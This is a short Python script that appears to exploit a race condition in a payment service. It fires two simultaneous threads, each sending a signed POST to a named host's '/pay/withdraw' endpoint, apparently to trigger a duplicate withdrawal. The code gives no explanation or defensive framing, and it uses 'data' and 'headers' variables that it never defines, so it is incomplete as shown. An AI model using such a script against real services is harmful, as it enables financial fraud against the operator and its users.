import _thread

import requests
import time


def confirm():
    res = requests.post("http://api.daydayaup.com:6979/pay/withdraw?sign=E2AD9250882D08661E5F7401AD5C6374", data=data,
                        headers=headers)
    print(res.text)


if __name__ == '__main__':
    _thread.start_new(confirm, ())
    _thread.start_new(confirm, ())
    time.sleep(10)
